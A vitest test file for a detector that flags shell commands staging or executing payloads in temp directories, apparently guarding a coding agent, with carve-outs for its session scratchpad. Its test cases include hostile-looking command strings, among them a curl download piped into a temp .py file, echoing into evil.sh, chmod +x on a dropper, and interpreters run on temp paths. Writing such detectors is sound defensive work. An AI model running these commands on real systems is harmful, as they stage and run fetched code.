// Co-located tests for the supply-chain dropper-staging detector.
//
// The old inline matcher produced three false-positive classes, all pinned as
// negative cases below:
//   1. It flagged the HOST SESSION SCRATCHPAD, the one out-of-repo location the
//      coding host provisions for the agent (see `sessionScratchpadAllows`).
//   2. It treated any redirect as payload staging, so writing a `.log` was
//      indistinguishable from dropping a `.sh`.
//   3. Its `[\s\S]*` was unbounded, pairing ANY `cat|echo|printf|tee` anywhere
//      in a compound command with ANY later `> /tmp/…` — the verb and the
//      redirect did not have to be related.

import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { detectDropperStaging } from "./dropper-staging.js";

const SESSION = "b67fec87-2403-4bd2-b799-0c262d627679";

/** A path inside this session's sanctioned scratchpad. */
function scratchpad(name: string): string {
	return join(tmpdir(), "claude-501", "-Users-me-proj", SESSION, "scratchpad", name);
}

/** A temp path OUTSIDE any session scratchpad. */
function bareTemp(name: string): string {
	return join(tmpdir(), name);
}

describe("detectDropperStaging — stages a payload", () => {
	it("flags a script-shaped redirect into a temp dir", () => {
		expect(detectDropperStaging(`echo 'payload' > ${bareTemp("evil.sh")}`, SESSION)).not.toBeNull();
	});

	it("flags a tee'd download into a temp dir", () => {
		const cmd = `curl -s http://x.tld/a | tee ${bareTemp("stage.py")}`;
		expect(detectDropperStaging(cmd, SESSION)).not.toBeNull();
	});

	it("flags an extensionless redirect target (no data-sink suffix to clear it)", () => {
		expect(detectDropperStaging(`printf 'x' > ${bareTemp("payload")}`, SESSION)).not.toBeNull();
	});

	it("returns the offending target so the warning can name it", () => {
		const target = bareTemp("evil.sh");
		expect(detectDropperStaging(`echo 'p' > ${target}`, SESSION)).toBe(target);
	});

	// The bare-token class must stop at quote characters, or a target lifted
	// out of a quoted argument carries the closing quote into the warning
	// (observed live: the message named `/tmp/6202033"`).
	it("does not swallow a trailing quote into the reported target", () => {
		const target = bareTemp("6202033");
		expect(detectDropperStaging(`interlinked harness test "osascript ${target}"`, SESSION)).toBe(
			target,
		);
	});
});

describe("detectDropperStaging — executes from a temp dir", () => {
	it("flags an interpreter pointed at a temp path", () => {
		expect(detectDropperStaging(`osascript ${bareTemp("x.scpt")}`, SESSION)).not.toBeNull();
	});

	it("flags chmod +x on a temp path", () => {
		expect(detectDropperStaging(`chmod +x ${bareTemp("dropper")}`, SESSION)).not.toBeNull();
	});

	it("flags execution even from the session scratchpad (execution is the payoff)", () => {
		expect(detectDropperStaging(`bash ${scratchpad("run.sh")}`, SESSION)).not.toBeNull();
	});
});

describe("detectDropperStaging — legitimate work is not flagged", () => {
	// The exact command that produced the false positive: a vitest log redirect
	// into the session scratchpad, with an `echo` appending the exit code.
	it("does not flag a log redirect into the session scratchpad", () => {
		const log = scratchpad("full-suite.log");
		const cmd = `npx vitest run --reporter=dot > ${log} 2>&1; echo "SUITE_EXIT=$?" >> ${log}`;
		expect(detectDropperStaging(cmd, SESSION)).toBeNull();
	});

	it("does not flag a data-sink redirect outside the scratchpad", () => {
		expect(detectDropperStaging(`ls -la > ${bareTemp("out.txt")}`, SESSION)).toBeNull();
	});

	it("does not pair an unrelated verb with an unrelated redirect", () => {
		// `cat` and the temp redirect are in different commands; the old
		// unbounded `[\s\S]*` matched across the whole compound string.
		const cmd = `cat README.md && ls > ${bareTemp("listing.log")}`;
		expect(detectDropperStaging(cmd, SESSION)).toBeNull();
	});

	it("does not flag redirects outside any temp root", () => {
		expect(detectDropperStaging("echo 'x' > ./scratch/probe.sh", SESSION)).toBeNull();
	});

	it("does not flag a plain command with no redirect or interpreter", () => {
		expect(detectDropperStaging("npm run build", SESSION)).toBeNull();
	});

	// Without a session id the scratchpad triad cannot be verified, so the
	// carve-out must NOT apply — a temp script still stages.
	it("still flags a temp script when no session id is available", () => {
		expect(detectDropperStaging(`echo 'p' > ${bareTemp("x.sh")}`, undefined)).not.toBeNull();
	});
});
